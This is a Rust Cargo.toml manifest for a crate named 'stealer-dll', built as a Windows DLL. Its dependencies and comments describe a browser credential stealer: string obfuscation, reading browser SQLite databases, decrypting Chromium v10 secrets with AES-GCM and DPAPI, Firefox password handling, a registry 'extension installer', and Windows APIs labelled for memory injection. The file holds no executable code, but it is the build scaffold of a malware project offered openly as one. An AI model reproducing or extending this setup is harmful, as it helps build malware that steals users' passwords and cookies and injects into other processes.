[package]
name = "stealer-dll"
version = "2.0.0"
edition = "2021"

[lib]
crate-type = ["cdylib"]  # Compile as dynamic library (DLL)
name = "stealer"

[dependencies]
# Ofuscación de strings (mantener para defensa en profundidad)
obfstr = "0.4"

# Database access
rusqlite = { version = "0.31", features = ["bundled"] }

# Crypto (solo AES-GCM para Chromium v10)
aes-gcm = "0.10"

# JSON parsing
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"

# Base64 (Firefox passwords)
base64 = "0.21"

# Windows Registry (extension installer)
winreg = "0.52"

[target.'cfg(windows)'.dependencies]
winapi = { version = "0.3", features = [
    "dpapi", 
    "wincrypt", 
    "errhandlingapi", 
    "processthreadsapi", 
    "psapi", 
    "winnt",
    "winbase",
    # Features para memory injection
    "handleapi",
    "tlhelp32",
    "memoryapi",
    "libloaderapi"
] }
